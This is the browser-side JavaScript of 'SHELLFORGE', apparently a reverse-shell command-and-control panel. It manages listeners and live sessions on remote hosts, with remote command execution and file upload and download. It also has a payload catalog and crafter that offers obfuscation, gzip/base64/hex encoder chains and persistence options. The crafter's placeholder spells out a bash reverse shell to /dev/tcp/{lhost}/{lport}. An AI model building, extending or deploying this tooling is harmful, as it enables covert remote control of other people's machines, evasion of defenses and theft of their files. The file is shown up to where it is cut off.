/* SHELLFORGE — SPDX-License-Identifier: AGPL-3.0-or-later */

const socket = io({
  transports: ['polling'],
  upgrade: false,
  rememberUpgrade: false,
});
const state = {
  sessions: {},
  currentSessionId: null,
  payloads: [],
  selectedPayloadId: null,
  listenerPort: null,
};

const $ = (s) => document.querySelector(s);
const $$ = (s) => Array.from(document.querySelectorAll(s));
const esc = (s) => String(s ?? '').replace(/[&<>"']/g, (c) => ({
  '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;',
}[c]));

/* ─────────── toast ─────────── */
function toast(kind, msg) {
  const box = $('#toasts'); if (!box) return;
  const el = document.createElement('div');
  el.className = `toast toast-${kind}`; el.textContent = msg;
  box.appendChild(el);
  setTimeout(() => {
    el.style.opacity = '0'; el.style.transition = 'opacity 0.2s';
    setTimeout(() => el.remove(), 200);
  }, 4000);
}

/* ─────────── socket ─────────── */
socket.on('connect', () => {
  const ws = $('#ws-status');
  if (ws) { ws.classList.add('connected');
    ws.querySelector('.ws-label').textContent = 'Live'; }
});
socket.on('disconnect', () => {
  const ws = $('#ws-status');
  if (ws) { ws.classList.remove('connected');
    ws.querySelector('.ws-label').textContent = 'Disconnected'; }
});
socket.on('sessions_init', (d) => {
  state.sessions = {};
  (d.sessions || []).forEach((s) => (state.sessions[s.id] = s));
  if (d.port) setListenerStatus(true, d.port);
  renderSessions();
});
socket.on('session_new', (s) => {
  state.sessions[s.id] = s; renderSessions();
  toast('success', `New session: ${s.user}@${s.host}`);
});
socket.on('session_gone', (d) => {
  delete state.sessions[d.id];
  if (state.currentSessionId === d.id) {
    state.currentSessionId = null; switchView('sessions');
  }
  renderSessions();
});
socket.on('command_output', (d) => {
  if (d.session_id === state.currentSessionId) appendTerm(d);
});
socket.on('session_info', (d) => {
  if (d.session_id !== state.currentSessionId) return;
  const i = d.info || {};
  const m = $('#interact-meta');
  if (m) m.textContent = `${i.os || '?'} · cwd: ${i.cwd || '?'} · pid: ${i.pid || '?'}`;
});
socket.on('listener_started', (d) => {
  setListenerStatus(true, d.port);
  const lh = $('#pl-lhost'), lp = $('#pl-lport');
  if (lh) lh.value = d.host === '0.0.0.0' ? '127.0.0.1' : d.host;
  if (lp) lp.value = d.port;
  toast('success', `Listener on ${d.host}:${d.port}`);
});
socket.on('listener_stopped', () => { setListenerStatus(false); toast('info', 'Listener stopped'); });
socket.on('upload_done', (d) => toast('success', `Uploaded ${d.size} bytes → ${d.path}`));
socket.on('download_ready', (d) => {
  try {
    const bin = atob(d.data);
    const arr = new Uint8Array(bin.length);
    for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
    const url = URL.createObjectURL(new Blob([arr]));
    const a = document.createElement('a');
    a.href = url; a.download = (d.path || 'file').split('/').pop(); a.click();
    URL.revokeObjectURL(url);
    toast('success', `Downloaded ${d.path}`);
  } catch (e) { toast('error', e.message); }
});
socket.on('error', (d) => toast('error', d.msg || 'error'));

/* ─────────── views ─────────── */
$$('.nav-item').forEach((el) => el.addEventListener('click', () => switchView(el.dataset.view)));
$$('[data-jump]').forEach((el) => el.addEventListener('click', () => switchView(el.dataset.jump)));
function switchView(view) {
  $$('.view').forEach((v) => v.classList.toggle('active', v.id === `view-${view}`));
  $$('.nav-item').forEach((n) => n.classList.toggle('active',
    n.dataset.view === view || (view === 'interact' && n.dataset.view === 'sessions')));
  const titles = { sessions: 'Sessions', interact: 'Interact', payloads: 'Payloads', listener: 'Listener' };
  const t = $('#view-title'); if (t) t.textContent = titles[view] || view;
  if (view === 'payloads') initPayloadsUI();
}

/* ─────────── sessions ─────────── */
function renderSessions() {
  const list = Object.values(state.sessions);
  const sc = $('#session-count'); if (sc) sc.textContent = list.length;
  const empty = $('#sessions-empty'); if (empty) empty.style.display = list.length ? 'none' : 'flex';
  const grid = $('#sessions-grid');
  if (grid) {
    grid.innerHTML = list.map((s) => `
      <div class="session-card">
        <div class="session-card-header"><span class="dot"></span><span>${esc(s.id)}</span></div>
        <div class="session-card-body">
          <div class="session-host">${esc(s.user)}@${esc(s.host)}</div>
          <div class="session-os">${esc(s.os)}</div>
        </div>
        <button class="btn btn-primary" data-interact="${esc(s.id)}">Interact</button>
      </div>`).join('');
    grid.querySelectorAll('[data-interact]').forEach((b) =>
      b.addEventListener('click', () => openSession(b.dataset.interact)));
  }
  const mini = $('#mini-sessions');
  if (mini) {
    mini.innerHTML = list.map((s) => `
      <div class="mini-session" data-open="${esc(s.id)}">
        <span class="dot"></span><span>${esc(s.user)}@${esc(s.host)}</span>
      </div>`).join('');
    mini.querySelectorAll('[data-open]').forEach((el) =>
      el.addEventListener('click', () => openSession(el.dataset.open)));
  }
}
function openSession(id) {
  const s = state.sessions[id]; if (!s) return;
  state.currentSessionId = id;
  const term = $('#terminal'); if (term) term.innerHTML = '';
  const tgt = $('#interact-target'); if (tgt) tgt.textContent = `${s.user}@${s.host}`;
  const m = $('#interact-meta'); if (m) m.textContent = `${s.os} · cwd: ${s.cwd || '?'}`;
  appendInfo(`Connected — id ${s.id}`);
  socket.emit('info', { session_id: id });
  switchView('interact');
  const ci = $('#command-input'); if (ci) setTimeout(() => ci.focus(), 100);
}

/* ─────────── terminal ─────────── */
function appendTerm(d) {
  const t = $('#terminal'); if (!t) return;
  let html = '';
  if (d.cmd) html += `<div class="term-line term-cmd"><span class="term-prompt">$</span>${esc(d.cmd)}</div>`;
  if (d.stdout) html += `<div class="term-line term-out">${esc(d.stdout)}</div>`;
  if (d.stderr) html += `<div class="term-line term-err">${esc(d.stderr)}</div>`;
  if (d.rc !== undefined && d.rc !== null && d.rc !== 0)
    html += `<div class="term-line term-rc">[rc=${d.rc}]</div>`;
  t.insertAdjacentHTML('beforeend', html);
  t.scrollTop = t.scrollHeight;
}
function appendInfo(msg) {
  const t = $('#terminal'); if (!t) return;
  t.insertAdjacentHTML('beforeend', `<div class="term-line term-info">${esc(msg)}</div>`);
  t.scrollTop = t.scrollHeight;
}
function sendCommand() {
  const ci = $('#command-input'); if (!ci) return;
  const cmd = ci.value.trim(); if (!cmd || !state.currentSessionId) return;
  appendTerm({ cmd });
  socket.emit('exec', { session_id: state.currentSessionId, cmd });
  ci.value = '';
}
const ciEl = $('#command-input');
if (ciEl) ciEl.addEventListener('keydown', (e) => {
  if (e.key === 'Enter') { e.preventDefault(); sendCommand(); }
});
const btnSend = $('#btn-send'); if (btnSend) btnSend.addEventListener('click', sendCommand);

/* ─────────── session actions ─────────── */
const btnKill = $('#btn-kill'); if (btnKill) btnKill.addEventListener('click', () => {
  if (!state.currentSessionId || !confirm('Kill this session?')) return;
  socket.emit('kill_session', { session_id: state.currentSessionId });
});
const btnInfo = $('#btn-info'); if (btnInfo) btnInfo.addEventListener('click', () => {
  if (state.currentSessionId) socket.emit('info', { session_id: state.currentSessionId });
});
const btnDl = $('#btn-download'); if (btnDl) btnDl.addEventListener('click', () => {
  if (!state.currentSessionId) return;
  const p = prompt('Remote path to download:'); if (!p) return;
  socket.emit('download', { session_id: state.currentSessionId, path: p });
});
const btnUl = $('#btn-upload'); if (btnUl) btnUl.addEventListener('click', () => {
  if (!state.currentSessionId) return;
  const inp = document.createElement('input'); inp.type = 'file';
  inp.onchange = () => {
    const f = inp.files[0]; if (!f) return;
    const remote = prompt('Remote path:', `/tmp/${f.name}`); if (!remote) return;
    const r = new FileReader();
    r.onload = () => {
      const b64 = String(r.result).split(',')[1] || '';
      socket.emit('upload', { session_id: state.currentSessionId, path: remote, data: b64 });
    };
    r.readAsDataURL(f);
  };
  inp.click();
});

/* ─────────── listener ─────────── */
function setListenerStatus(running, port) {
  state.listenerPort = running ? port : null;
  const dot = $('#listener-status'); if (dot) dot.classList.toggle('running', !!running);
  const cur = $('#listener-current'); if (cur) cur.textContent = running ? `Listening on port ${port}` : 'Not running';
  const start = $('#btn-start-listener'); if (start) start.disabled = !!running;
  const stop = $('#btn-stop-listener'); if (stop) stop.disabled = !running;
}
const btnLs = $('#btn-start-listener'); if (btnLs) btnLs.addEventListener('click', () => {
  const host = ($('#listener-host')?.value) || '0.0.0.0';
  const port = parseInt($('#listener-port')?.value) || 4444;
  const key = ($('#listener-key')?.value) || null;
  socket.emit('start_listener', { host, port, key });
});
const btnLo = $('#btn-stop-listener'); if (btnLo) btnLo.addEventListener('click', () => socket.emit('stop_listener'));

/* ═══════════════════════════════════════════════════════════
   PAYLOADS SECTION
   ═══════════════════════════════════════════════════════════ */

const CUSTOM_KEY = 'shellforge_custom_payloads';
let payloadsLoaded = false;
let buildTimer = null;

/* ─── custom payload storage (localStorage) ─── */
function loadCustomPayloads() {
  try { return JSON.parse(localStorage.getItem(CUSTOM_KEY) || '[]'); }
  catch { return []; }
}
function saveCustomPayloads(list) {
  localStorage.setItem(CUSTOM_KEY, JSON.stringify(list));
}
function allPayloads() {
  return [...state.payloads, ...loadCustomPayloads()];
}
function newCustomId() {
  return 'custom_' + Math.random().toString(36).slice(2, 10);
}

/* ─── CSS injection ─── */
function injectPayloadStyles() {
  if (document.getElementById('pl-styles')) return;
  const style = document.createElement('style');
  style.id = 'pl-styles';
  style.textContent = `
.pl-layout{display:grid;grid-template-columns:340px 1fr;gap:20px;height:100%;min-height:0}
.pl-sidebar{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius-lg);display:flex;flex-direction:column;overflow:hidden}
.pl-sidebar-head{display:flex;align-items:center;justify-content:space-between;padding:14px 16px;border-bottom:1px solid var(--border);font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:.06em;color:var(--text-muted)}
.pl-list{flex:1;overflow-y:auto;padding:8px;display:flex;flex-direction:column;gap:6px}
.pl-card{padding:12px 14px;border-radius:var(--radius);background:var(--surface-2);border:1px solid transparent;cursor:pointer;transition:all .15s}
.pl-card:hover{background:var(--surface-3);border-color:var(--border-strong)}
.pl-card.active{background:var(--accent-soft);border-color:rgba(255,90,95,.4)}
.pl-card-head{display:flex;align-items:center;gap:6px;margin-bottom:4px;flex-wrap:wrap}
.pl-card-name{font-weight:600;font-size:13px;color:var(--text);flex:1}
.pl-badge-persist{background:rgba(255,90,95,.15);color:var(--accent);font-size:9px;padding:1px 7px;border-radius:10px;font-weight:700;text-transform:uppercase;letter-spacing:.06em}
.pl-badge-custom{background:rgba(167,139,250,.18);color:#a78bfa;font-size:9px;padding:1px 7px;border-radius:10px;font-weight:700;text-transform:uppercase;letter-spacing:.06em}
.pl-card-desc{font-size:11.5px;color:var(--text-muted);line-height:1.4;margin-bottom:8px}
.pl-card-meta{display:flex;gap:4px;flex-wrap:wrap}
.pl-os{font-size:9.5px;padding:1px 6px;border-radius:4px;background:var(--surface-3);color:var(--text-muted);text-transform:uppercase;letter-spacing:.04em;font-weight:700}
.pl-os-linux{color:#f9c74f}.pl-os-macos{color:#90be6d}.pl-os-windows{color:#4cc9f0}
.pl-main{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius-lg);display:flex;flex-direction:column;overflow:hidden;min-height:0}
.pl-empty{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:10px;color:var(--text-muted);padding:60px 20px;text-align:center}
.pl-empty svg{color:var(--text-dim);opacity:.5}
.pl-empty h3{font-size:15px;font-weight:600;color:var(--text)}
.pl-empty p{font-size:13px;max-width:340px}
.pl-detail-head{display:flex;align-items:flex-start;justify-content:space-between;gap:16px;padding:18px 22px;border-bottom:1px solid var(--border);flex-shrink:0}
.pl-detail-title{font-size:17px;font-weight:600;margin-bottom:4px}
.pl-detail-desc{font-size:13px;color:var(--text-muted)}
.pl-detail-actions{display:flex;gap:6px;flex-shrink:0;flex-wrap:wrap}
.pl-detail-meta{padding:14px 22px;border-bottom:1px solid var(--border);display:flex;flex-direction:column;gap:8px;flex-shrink:0}
.pl-meta-row{display:flex;align-items:center;gap:10px;font-size:12px;color:var(--text-muted);flex-wrap:wrap}
.pl-meta-label{min-width:90px;font-weight:700;text-transform:uppercase;letter-spacing:.06em;font-size:10px;color:var(--text-dim)}
.pl-meta-row code{background:var(--surface-3);padding:1px 6px;border-radius:4px;font-size:11px;color:var(--cyan);font-family:var(--mono)}
.pl-persist-note{color:var(--accent);font-weight:600}
.pl-config{padding:16px 22px;border-bottom:1px solid var(--border);display:flex;flex-direction:column;gap:12px;flex-shrink:0}
.pl-config .field-row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
.pl-code-wrap{flex:1;display:flex;flex-direction:column;min-height:0}
.pl-code-head{display:flex;align-items:center;justify-content:space-between;padding:10px 22px;border-bottom:1px solid var(--border);font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.06em;color:var(--text-muted)}
.pl-code{flex:1;overflow:auto;padding:16px 22px;margin:0;font-family:var(--mono);font-size:12px;line-height:1.6;color:var(--text);white-space:pre-wrap;word-break:break-word;background:#08090d}
/* crafter modal */
.pl-cr-bg{position:fixed;inset:0;background:rgba(0,0,0,.75);display:none;align-items:center;justify-content:center;z-index:2000;padding:20px;backdrop-filter:blur(4px)}
.pl-cr-bg.open{display:flex}
.pl-cr{background:var(--surface);border:1px solid var(--border-strong);border-radius:var(--radius-lg);width:100%;max-width:1100px;height:90vh;max-height:800px;display:flex;flex-direction:column;box-shadow:0 24px 80px rgba(0,0,0,.6);overflow:hidden}
.pl-cr-head{display:flex;align-items:center;justify-content:space-between;padding:16px 22px;border-bottom:1px solid var(--border);flex-shrink:0}
.pl-cr-head h2{font-size:17px;font-weight:600}
.pl-cr-close{background:transparent;border:none;color:var(--text-muted);font-size:20px;cursor:pointer;padding:4px 10px;border-radius:6px;line-height:1}
.pl-cr-close:hover{background:var(--surface-3);color:var(--text)}
.pl-cr-body{flex:1;display:grid;grid-template-columns:240px 1fr;overflow:hidden;min-height:0}
.pl-cr-start{border-right:1px solid var(--border);background:var(--surface-2);overflow-y:auto;padding:14px 10px}
.pl-cr-start h4{font-size:10px;text-transform:uppercase;letter-spacing:.08em;color:var(--text-dim);font-weight:700;padding:0 6px 8px}
.pl-start-opt{display:block;width:100%;text-align:left;background:transparent;border:1px solid transparent;color:var(--text-muted);padding:9px 11px;border-radius:8px;font-size:12.5px;cursor:pointer;margin-bottom:3px;font-family:inherit;transition:all .12s}
.pl-start-opt:hover{background:var(--surface-3);color:var(--text)}
.pl-start-opt.active{background:var(--accent-soft);color:var(--accent);border-color:rgba(255,90,95,.35)}
.pl-start-opt.blank{font-weight:700;color:var(--text);border:1px dashed var(--border-strong);margin-bottom:10px}
.pl-start-opt.blank:hover{border-color:var(--accent);color:var(--accent);background:var(--accent-soft)}
.pl-cr-main{padding:16px 22px;display:flex;flex-direction:column;gap:12px;overflow-y:auto;min-height:0}
.pl-cr-main .field{display:flex;flex-direction:column;gap:6px}
.pl-cr-main .field label{font-size:11px;font-weight:600;color:var(--text-muted);text-transform:uppercase;letter-spacing:.05em}
.pl-cr-main .field input,.pl-cr-main .field select{background:var(--surface-2);border:1px solid var(--border);border-radius:8px;padding:8px 12px;color:var(--text);font-family:inherit;font-size:13px;outline:none;transition:border-color .15s}
.pl-cr-main .field input:focus{border-color:var(--accent)}
.pl-cr-main .field-row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
.pl-cr-main .check-group{display:flex;flex-wrap:wrap;gap:8px}
.pl-cr-main .check{display:inline-flex;align-items:center;gap:6px;font-size:12px;color:var(--text-muted);cursor:pointer;padding:5px 10px;border-radius:8px;border:1px solid var(--border);background:var(--surface-2);transition:all .15s}
.pl-cr-main .check input{accent-color:var(--accent)}
.pl-cr-main .check:has(input:checked){background:var(--accent-soft);border-color:rgba(255,90,95,.4);color:var(--text)}
.pl-cr-code-wrap{flex:1;display:flex;flex-direction:column;min-height:200px;margin-top:6px}
.pl-cr-code-head{display:flex;align-items:center;justify-content:space-between;padding:8px 12px;background:var(--surface-3);border-radius:8px 8px 0 0;font-size:10px;text-transform:uppercase;letter-spacing:.06em;color:var(--text-muted);font-weight:700}
.pl-cr-code-head code{background:var(--surface);padding:1px 5px;border-radius:4px;color:var(--cyan);font-family:var(--mono);font-size:10.5px;text-transform:none;letter-spacing:0}
.pl-cr-code-edit{flex:1;background:#08090d;border:1px solid var(--border);border-top:none;border-radius:0 0 8px 8px;padding:12px 14px;color:var(--text);font-family:var(--mono);font-size:12px;line-height:1.6;resize:none;outline:none;min-height:150px}
.pl-cr-code-edit:focus{border-color:var(--accent)}
.pl-cr-foot{display:flex;align-items:center;gap:10px;padding:14px 22px;border-top:1px solid var(--border);background:var(--surface-2);flex-shrink:0}
.pl-cr-foot .dim{font-size:12px;flex:1}
.pl-cr-hint{background:rgba(34,211,238,.08);border:1px solid rgba(34,211,238,.25);border-radius:8px;padding:10px 14px;font-size:12px;color:var(--text-muted);line-height:1.5}
.pl-cr-hint code{color:var(--cyan);background:var(--surface-3);padding:1px 5px;border-radius:3px;font-family:var(--mono);font-size:11px}
  `;
  document.head.appendChild(style);
}

/* ─── build payload UI ─── */
function initPayloadsUI() {
  const view = $('#view-payloads'); if (!view) return;
  injectPayloadStyles();
  if (!view.dataset.built) {
    view.dataset.built = '1';
    view.innerHTML = `
      <div class="pl-layout">
        <aside class="pl-sidebar">
          <div class="pl-sidebar-head">
            <span>Payload Catalog</span>
            <button class="btn btn-primary btn-sm" id="btn-create-payload">+ New</button>
          </div>
          <div class="pl-list" id="payload-grid"></div>
        </aside>
        <section class="pl-main" id="payload-detail">
          <div class="pl-empty">
            <svg viewBox="0 0 24 24" width="42" height="42" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round">
              <polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/>
            </svg>
            <h3>Select a payload</h3>
            <p>Pick from the catalog, or click "+ New" to craft your own.</p>
          </div>
        </section>
      </div>

      <div class="pl-cr-bg" id="pl-crafter">
        <div class="pl-cr">
          <div class="pl-cr-head">
            <h2 id="pl-cr-title">Craft Payload</h2>
            <button class="pl-cr-close" id="pl-cr-close">✕</button>
          </div>
          <div class="pl-cr-body">
            <aside class="pl-cr-start">
              <h4>Start from</h4>
              <button class="pl-start-opt blank" data-base="__blank__">Blank template</button>
              <div id="pl-start-list"></div>
            </aside>
            <div class="pl-cr-main">
              <div class="pl-cr-hint">
                Use placeholders in your code — they'll be substituted live:
                <code>{lhost}</code> <code>{lport}</code>
                <code>{key_repr}</code> <code>{filename}</code>
              </div>
              <div class="field-row">
                <div class="field">
                  <label>Name *</label>
                  <input id="pl-c-name" placeholder="My Custom Payload" maxlength="60">
                </div>
                <div class="field">
                  <label>Filename</label>
                  <input id="pl-c-fn" value="payload.sh" maxlength="60">
                </div>
              </div>
              <div class="field">
                <label>Description</label>
                <input id="pl-c-desc" placeholder="What does this payload do?" maxlength="140">
              </div>
              <div class="field-row">
                <div class="field">
                  <label>Target OS</label>
                  <div class="check-group">
                    <label class="check"><input type="checkbox" id="pl-c-linux" checked> linux</label>
                    <label class="check"><input type="checkbox" id="pl-c-macos"> macos</label>
                    <label class="check"><input type="checkbox" id="pl-c-windows"> windows</label>
                  </div>
                </div>
                <div class="field">
                  <label>Flags</label>
                  <div class="check-group">
                    <label class="check"><input type="checkbox" id="pl-c-persist"> persistence</label>
                    <label class="check"><input type="checkbox" id="pl-c-haskey" checked> supports XOR key</label>
                  </div>
                </div>
              </div>
              <div class="field pl-cr-code-wrap">
                <div class="pl-cr-code-head">
                  <span>Payload code</span>
                  <span id="pl-c-chars">0 chars</span>
                </div>
                <textarea id="pl-c-code" class="pl-cr-code-edit" spellcheck="false"
                  placeholder="#!/bin/bash&#10;# my custom shell&#10;bash -i >&amp; /dev/tcp/{lhost}/{lport} 0>&amp;1"></textarea>
              </div>
            </div>
          </div>
          <div class="pl-cr-foot">
            <span class="dim" id="pl-c-status"></span>
            <button class="btn btn-ghost" id="pl-c-cancel">Cancel</button>
            <button class="btn btn-primary" id="pl-c-save">Save to catalog</button>
          </div>
        </div>
      </div>
    `;
    wireCrafter();
  }
  if (!payloadsLoaded) loadPayloads();
}

/* ─── load payloads ─── */
async function loadPayloads() {
  try {
    const r = await fetch('/api/payloads');
    const text = await r.text();
    let j;
    try { j = JSON.parse(text); }
    catch (_) { throw new Error(`backend returned non-JSON (HTTP ${r.status}). First 80 chars: ${text.slice(0, 80)}`); }
    if (!j.ok) throw new Error(j.error || 'load failed');
    state.payloads = j.payloads || [];
    payloadsLoaded = true;
    renderPayloadList();
  } catch (e) {
    toast('error', e.message);
    console.error('[payloads]', e);
  }
}

/* ─── render list ─── */
function renderPayloadList() {
  const grid = $('#payload-grid'); if (!grid) return;
  const all = allPayloads();
  if (!all.length) {
    grid.innerHTML = '<p class="dim" style="padding:12px">No payloads available</p>';
    return;
  }
  grid.innerHTML = all.map((p) => `
    <div class="pl-card ${state.selectedPayloadId === p.id ? 'active' : ''}" data-pid="${esc(p.id)}">
      <div class="pl-card-head">
        <span class="pl-card-name">${esc(p.name)}</span>
        ${p.custom ? '<span class="pl-badge-custom">custom</span>' : ''}
        ${p.persistence ? '<span class="pl-badge-persist">persist</span>' : ''}
      </div>
      <div class="pl-card-desc">${esc(p.description || '')}</div>
      <div class="pl-card-meta">
        ${(p.os || []).map((o) => `<span class="pl-os pl-os-${esc(o)}">${esc(o)}</span>`).join('')}
      </div>
    </div>
  `).join('');
  grid.querySelectorAll('[data-pid]').forEach((el) =>
    el.addEventListener('click', () => selectPayload(el.dataset.pid)));
}

/* ─── select payload ─── */
async function selectPayload(id) {
  state.selectedPayloadId = id;
  renderPayloadList();
  const p = allPayloads().find((x) => x.id === id);
  if (!p) return;
  const detail = $('#payload-detail'); if (!detail) return;
  const isCustom = !!p.custom;

  detail.innerHTML = `
    <div class="pl-detail-head">
      <div>
        <h2 class="pl-detail-title">${esc(p.name)} ${isCustom ? '<span class="pl-badge-custom" style="font-size:10px;padding:2px 8px;vertical-align:middle">custom</span>' : ''}</h2>
        <p class="pl-detail-desc">${esc(p.description || '')}</p>
      </div>
      <div class="pl-detail-actions">
        ${isCustom ? '<button class="btn btn-ghost btn-sm" id="btn-pl-edit">Edit</button>' : ''}
        ${isCustom ? '<button class="btn btn-ghost btn-sm" id="btn-pl-delete">Delete</button>' : ''}
        <button class="btn btn-ghost btn-sm" id="btn-pl-copy">Copy</button>
        <button class="btn btn-ghost btn-sm" id="btn-pl-download">Download</button>
      </div>
    </div>
    <div class="pl-detail-meta">
      <div class="pl-meta-row">
        <span class="pl-meta-label">OS</span>
        <span>${(p.os || []).map((o) => `<span class="pl-os pl-os-${esc(o)}">${esc(o)}</span>`).join(' ')}</span>
      </div>
      ${(p.requires && p.requires.length) ? `<div class="pl-meta-row"><span class="pl-meta-label">Requires</span><span>${p.requires.map((r) => `<code>${esc(r)}</code>`).join(' ')}</span></div>` : ''}
      ${p.persistence ? '<div class="pl-meta-row"><span class="pl-meta-label">Persistence</span><span class="pl-persist-note">Survives shell close</span></div>' : ''}
    </div>
    <div class="pl-config">
      <div class="field-row">
        <div class="field"><label>LHOST</label><input id="pl-lhost" value="127.0.0.1"></div>
        <div class="field"><label>LPORT</label><input id="pl-lport" type="number" value="4444"></div>
      </div>
      ${p.has_key ? '<div class="field"><label>XOR key <span class="dim">(optional)</span></label><input id="pl-key" placeholder="hunter2"></div>' : ''}
      ${!isCustom ? `
        <div class="field">
          <label>Obfuscation</label>
          <select id="pl-obfuscate">
            <option value="none">None</option>
            <option value="light">Light</option>
            <option value="heavy">Heavy</option>
          </select>
        </div>
        <div class="field">
          <label>Encoder chain</label>
          <div class="check-group">
            <label class="check"><input type="checkbox" data-enc value="gzip"> gzip</label>
            <label class="check"><input type="checkbox" data-enc value="b64"> base64</label>
            <label class="check"><input type="checkbox" data-enc value="url"> urlencode</label>
            <label class="check"><input type="checkbox" data-enc value="hex"> hex</label>
          </div>
        </div>` : ''}
    </div>
    <div class="pl-code-wrap">
      <div class="pl-code-head">
        <span>Payload code</span>
        <span class="dim" id="pl-code-size"></span>
      </div>
      <pre class="pl-code" id="pl-code">Loading…</pre>
    </div>
  `;

  ['pl-lhost', 'pl-lport', 'pl-key', 'pl-obfuscate'].forEach((fid) => {
    const el = $('#' + fid);
    if (el) { el.addEventListener('input', debouncedBuild); el.addEventListener('change', debouncedBuild); }
  });
  $$('[data-enc]').forEach((cb) => cb.addEventListener('change', debouncedBuild));

  $('#btn-pl-copy')?.addEventListener('click', () => {
    navigator.clipboard.writeText($('#pl-code')?.textContent || '')
      .then(() => toast('success', 'Copied'))
      .catch((e) => toast('error', e.message));
  });
  $('#btn-pl-download')?.addEventListener('click', () => {
    const code = $('#pl-code')?.textContent || '';
    const blob = new Blob([code], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url; a.download = p.default_filename || 'payload.txt'; a.click();
    URL.revokeObjectURL(url);
  });
  $('#btn-pl-edit')?.addEventListener('click', () => openCrafter(p));
  $('#btn-pl-delete')?.addEventListener('click', () => {
    if (!confirm(`Delete custom payload "${p.name}"?`)) return;
    saveCustomPayloads(loadCustomPayloads().filter((x) => x.id !== p.id));
    state.selectedPayloadId = null;
    renderPayloadList();
    detail.innerHTML = `<div class="pl-empty">
      <svg viewBox="0 0 24 24" width="42" height="42" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round">
        <polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/>
      </svg>
      <h3>Select a payload</h3><p>Pick from the catalog, or click "+ New" to craft your own.</p>
    </div>`;
    toast('info', `Deleted "${p.name}"`);
  });

  if (state.listenerPort) { const lp = $('#pl-lport'); if (lp) lp.value = state.listenerPort; }
  await buildPayloadPreview(p);
}

/* ─── live build preview ─── */
function debouncedBuild() {
  clearTimeout(buildTimer);
  buildTimer = setTimeout(() => {
    const p = allPayloads().find((x) => x.id === state.selectedPayloadId);
    if (p) buildPayloadPreview(p);
  }, 250);
}

async function buildPayloadPreview(p) {
  const lhost = $('#pl-lhost')?.value || '127.0.0.1';
  const lport = parseInt($('#pl-lport')?.value) || 4444;
  const key = $('#pl-key')?.value || null;
  const pre = $('#pl-code'); if (!pre) return;

  if (p.custom) {
    pre.textContent = substitute(p.template, lhost, lport, key, p.default_filename);
    const sz = $('#pl-code-size');
    if (sz) sz.textContent = `${pre.textContent.length.toLocaleString()} chars`;
    return;
  }

  pre.textContent = 'Building…';
  const obfuscate = $('#pl-obfuscate')?.value || 'none';
  const encode = $$('[data-enc]:checked').map((c) => c.value);
  try {
    const r = await fetch(`/api/payloads/${encodeURIComponent(p.id)}/build`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ lhost, lport, key, obfuscate, encode, raw: false }),
    });
    const j = await r.json();
    if (!j.ok) throw new Error(j.error || 'build failed');
    pre.textContent = j.payload;
    const sz = $('#pl-code-size');
    if (sz) sz.textContent = `${j.payload.length.toLocaleString()} chars`;
  } catch (e) {
    pre.textContent = `# error: ${e.message}`;
  }
}

/* ─── client-side template substitution (for custom payloads) ─── */
function substitute(tpl, lhost, lport, key, filename) {
  const keyRepr = key ? `'${key.replace(/'/g, "\\'")}'` : 'None';
  return String(tpl || '')
    .replace(/\{lhost\}/g, lhost)
    .replace(/\{lport\}/g, String(lport))
    .replace(/\{key_repr\}/g, keyRepr)
    .replace(/\{filename\}/g, filename || 'payload');
}

/* ─── fetch template of an existing payload (reverse substitution) ─── */
async function fetchTemplate(id) {
  const r = await fetch(`/api/payloads/${encodeURIComponent(id)}/build`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      lhost: 'LHOST_REMOTE_PLACEHOLDER',
      lport: 999999999,
      key: 'XORKEY_PLACEHOLDER',
      obfuscate: 'none',
      encode: [],
      raw: false,
    }),
  });
  const j = await r.json();
  if (!j.ok) throw new Error(j.error || 'failed to fetch template');
  return j.payload
    .replace(/LHOST_REMOTE_PLACEHOLDER/g, '{lhost}')
    .replace(/999999999/g, '{lport}')
    .replace(/'XORKEY_PLACEHOLDER'/g, '{key_repr}');
}

/* ─── crafter modal ─── */
let crafterState = { editingId: null };

function wireCrafter() {
  $('#btn-create-payload')?.addEventListener('click', () => openCrafter(null));
  $('#pl-cr-close')?.addEventListener('click', closeCrafter);
  $('#pl-c-cancel')?.addEventListener('click', closeCrafter);
  $('#pl-c-save')?.addEventListener('click', saveCraftedPayload);

  const code = $('#pl-c-code');
  if (code) {
    code.addEventListener('input', () => {
      const c = $('#pl-c-chars');
      if (c) c.textContent = `${code.value.length.toLocaleString()} chars`;
    });
    code.addEventListener('keydown', (e) => {
      if (e.key === 'Tab') {
        e.preventDefault();
        const s = code.selectionStart, en = code.selectionEnd;
        code.value = code.value.substring(0, s) + '    ' + code.value.substring(en);
        code.selectionStart = code.selectionEnd = s + 4;
      }
    });
  }

  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && $('#pl-crafter')?.classList.contains('open')) closeCrafter();
  });
}

async function openCrafter(existingPayload) {
  const modal = $('#pl-crafter'); if (!modal) return;
  injectPayloadStyles();
  crafterState.editingId = existingPayload ? existingPayload.id : null;

  const title = $('#pl-cr-title');
  if (title) title.textContent = existingPayload ? 'Edit Payload' : 'Craft Payload';

  // reset form
  const n = $('#pl-c-name'), d = $('#pl-c-desc'), f = $('#pl-c-fn'), c = $('#pl-c-code');
  if (n) n.value = '';
  if (d) d.value = '';
  if (f) f.value = 'payload.sh';
  if (c) c.value = '';
  const chars = $('#pl-c-chars'); if (chars) chars.textContent = '0 chars';
  const status = $('#pl-c-status'); if (status) status.textContent = '';
  ['linux', 'macos', 'windows'].forEach((os) => {
    const el = $(`#pl-c-${os}`); if (el) el.checked = os === 'linux';
  });
  const pers = $('#pl-c-persist'); if (pers) pers.checked = false;
  const hk = $('#pl-c-haskey'); if (hk) hk.checked = true;

  // populate "start from" list
  const listEl = $('#pl-start-list');
